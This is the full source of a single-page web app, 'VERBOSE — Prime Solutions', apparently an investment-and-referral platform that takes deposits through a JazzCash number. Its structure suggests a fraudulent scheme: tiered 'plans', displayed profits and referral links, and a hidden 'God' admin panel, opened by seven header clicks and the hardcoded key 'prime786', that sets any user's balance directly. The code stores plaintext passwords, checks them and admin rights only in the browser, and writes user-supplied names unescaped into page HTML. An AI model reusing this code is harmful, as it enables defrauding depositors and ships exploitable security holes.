<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>VERBOSE — Prime Solutions</title>
<style>
  :root{ --neon:#00f7ff; --accent:#ff5cff; --dark:#070707; --panel:#0f1114; }
  *{box-sizing:border-box}
  body { margin:0; font-family:Inter, Arial, sans-serif; background:var(--dark); color:#fff; overflow-x:hidden; }
  header { text-align:center; padding:24px 12px; font-size:28px; font-weight:800; background:linear-gradient(90deg,var(--neon),var(--accent)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; cursor:pointer; }
  .login-box, .page { max-width:430px; margin:18px auto; background:rgba(255,255,255,0.02); padding:18px; border-radius:12px; border:1px solid rgba(0,255,240,0.06); box-shadow:0 8px 30px rgba(0,0,0,0.6); }
  input,button,select { width:100%; padding:10px; margin-top:10px; border-radius:8px; border:1px solid rgba(0,255,240,0.08); background:transparent; color:#fff; outline:none; }
  button { background:linear-gradient(90deg,var(--neon),var(--accent)); border:none; color:#001; font-weight:700; cursor:pointer; }
  .nav { position:fixed; bottom:0; left:0; right:0; background:rgba(15,17,20,0.98); display:flex; justify-content:space-around; padding:12px; border-top:1px solid rgba(0,255,240,0.04); font-size:11px; z-index:1000; }
  .nav div{text-align:center;cursor:pointer; width:60px;}
  .hidden{display:none;}
  .user-box { background:linear-gradient(90deg, rgba(0,255,240,0.06), rgba(255,92,255,0.02)); padding:14px; border-radius:12px; margin-bottom:12px; border:1px solid rgba(0,255,240,0.06); }
  .plan-box { border:1px solid rgba(0,255,240,0.06); padding:12px; margin:10px 0; border-radius:10px; display:flex; justify-content:space-between; align-items:center; }
  .small {font-size:12px; color:rgba(230,247,251,0.6);}
</style>
</head>
<body>

<header id="mainHeader">VERBOSE</header>

<div id="loginPage" class="login-box">
  <h2>Login / Signup</h2>
  <input id="user" placeholder="Username" />
  <input id="pass" placeholder="Password" type="password" />
  <button id="authBtn">Enter Portal</button>
</div>

<div id="dashboard" class="page hidden">
  <div class="user-box">
    <div id="dashUser" style="font-size:18px; font-weight:800;">Welcome</div>
    <div style="margin-top:5px;">Balance: Rs <span id="dashBalance">0</span></div>
    <div class="small">Profit Earned: Rs <span id="dashDaily">0</span></div>
  </div>
  <div class="user-box">
    <p class="small">Invite Link:</p>
    <input id="refLink" readonly style="font-size:10px; border-style:dashed;">
    <button onclick="copyRef()">Copy Referral</button>
  </div>
</div>

<div id="plans" class="page hidden">
  <h3>Investment Plans</h3>
  <div id="plansList"></div>
</div>

<div id="finance" class="page hidden">
  <h3>Transactions</h3>
  <div class="user-box">
    <p class="small">JazzCash: 03705519562</p>
    <input id="txAmount" type="number" placeholder="Amount">
    <input id="txId" placeholder="Transaction ID (For Deposit)">
    <button onclick="reqAction('deposit')">Submit Deposit</button>
    <button onclick="reqAction('withdraw')" style="background:var(--accent); margin-top:5px;">Request Withdraw</button>
  </div>
</div>

<div id="about" class="page hidden">
  <h3>About & Privacy</h3>
  <p class="small">Powered by Prime Solutions. Secure transparent assets.</p>
  <p class="small">WhatsApp: 03705519562</p>
  <p class="small">Email: rock.earn92@gmail.com</p>
</div>

<div id="godMode" class="page hidden" style="border: 2px dashed var(--neon);">
  <h2 style="color:var(--neon); text-align:center;">⚡ ADMIN ⚡</h2>
  <input id="adminSearch" placeholder="Username">
  <button onclick="adminFetch()">Fetch</button>
  <div id="adminEdit" class="hidden">
    <input id="adminBal" type="number" placeholder="New Balance">
    <button onclick="adminUpdate()">Update User</button>
  </div>
  <div id="pendingZone" class="small" style="margin-top:15px;"></div>
  <button onclick="showPage('dashboard')">Close</button>
</div>

<div id="bottomNav" class="nav hidden">
  <div onclick="showPage('dashboard')">🏠<br>Home</div>
  <div onclick="showPage('plans')">📦<br>Plans</div>
  <div onclick="showPage('finance')">💰<br>Cash</div>
  <div onclick="showPage('about')">ℹ️<br>Info</div>
  <div onclick="logout()">🚪<br>Exit</div>
  <div onclick="showPage('godMode')" id="adminBtn" class="hidden">⚡<br>God</div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const config = {
    apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
    authDomain: "dark-web-9.firebaseapp.com",
    projectId: "dark-web-9",
    databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
    storageBucket: "dark-web-9.firebasestorage.app",
    messagingSenderId: "564328425161",
    appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
  };

  const app = initializeApp(config);
  const db = getDatabase(app);

  // AUTH
  document.getElementById('authBtn').onclick = async () => {
    const u = document.getElementById('user').value.trim();
    const p = document.getElementById('pass').value.trim();
    if(!u || !p) return alert("Fill all fields!");

    const userRef = ref(db, 'users/' + u);
    const snap = await get(userRef);

    if(snap.exists()){
      if(snap.val().password === p) startApp(u, snap.val());
      else alert("Wrong password!");
    } else {
      const data = { username:u, password:p, balance:0, dailyProfit:0, ref: Math.random().toString(36).substring(7) };
      await set(userRef, data);
      startApp(u, data);
    }
  };

  function startApp(u, data) {
    localStorage.setItem('v_user', u);
    document.getElementById('dashUser').innerText = u;
    document.getElementById('dashBalance').innerText = data.balance;
    document.getElementById('dashDaily').innerText = data.dailyProfit;
    document.getElementById('refLink').value = "https://gtv140.github.io/verbose/?ref=" + data.ref;
    
    document.getElementById('loginPage').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    document.getElementById('bottomNav').classList.remove('hidden');
    
    renderPlans();
    listenAdmin();
  }

  // PLANS (1-25)
  function renderPlans() {
    const list = document.getElementById('plansList');
    list.innerHTML = "";
    for(let i=1; i<=25; i++) {
      const invest = Math.round(200 + (i-1)*(30000-200)/24);
      list.innerHTML += `<div class="plan-box">
        <div>Plan ${i}<br><span class="small">Invest: Rs ${invest}</span></div>
        <button onclick="showPage('finance')" style="width:70px; font-size:10px;">Select</button>
      </div>`;
    }
  }

  // ADMIN
  let c = 0;
  document.getElementById('mainHeader').onclick = () => {
    c++; if(c === 7) {
      if(prompt("Key:") === "prime786") {
        document.getElementById('adminBtn').classList.remove('hidden');
        showPage('godMode');
      }
      c=0;
    }
  };

  window.adminFetch = async () => {
    const u = document.getElementById('adminSearch').value;
    const s = await get(ref(db, 'users/' + u));
    if(s.exists()) {
      document.getElementById('adminBal').value = s.val().balance;
      document.getElementById('adminEdit').classList.remove('hidden');
    }
  };

  window.adminUpdate = async () => {
    const u = document.getElementById('adminSearch').value;
    await update(ref(db, 'users/' + u), { balance: parseFloat(document.getElementById('adminBal').value) });
    alert("Updated!");
  };

  function listenAdmin() {
    onValue(ref(db, 'deposits'), (snap) => {
      const p = document.getElementById('pendingZone');
      p.innerHTML = "<h4>Requests</h4>";
      const data = snap.val();
      for(let id in data) {
        if(data[id].status === 'pending') {
          p.innerHTML += `<div>${data[id].user}: Rs ${data[id].amount} <button onclick="appr('${id}','${data[id].user}',${data[id].amount})">Approve</button></div>`;
        }
      }
    });
  }

  window.appr = async (id, u, amt) => {
    const s = await get(ref(db, 'users/' + u));
    await update(ref(db, 'users/' + u), { balance: (s.val().balance || 0) + amt });
    await update(ref(db, 'deposits/' + id), { status: 'success' });
    alert("Done!");
  };

  // HELPERS
  window.showPage = (id) => {
    document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
    document.getElementById(id).classList.remove('hidden');
  };
  window.reqAction = (type) => {
    const u = localStorage.getItem('v_user');
    const amt = document.getElementById('txAmount').value;
    set(ref(db, 'deposits/' + Date.now()), { user:u, amount:parseFloat(amt), type:type, status:'pending' });
    alert("Request Sent!");
  };
  window.copyRef = () => { document.getElementById('refLink').select(); document.execCommand('copy'); alert("Link Copied!"); };
  window.logout = () => { localStorage.clear(); location.reload(); };
</script>
</body>
</html>
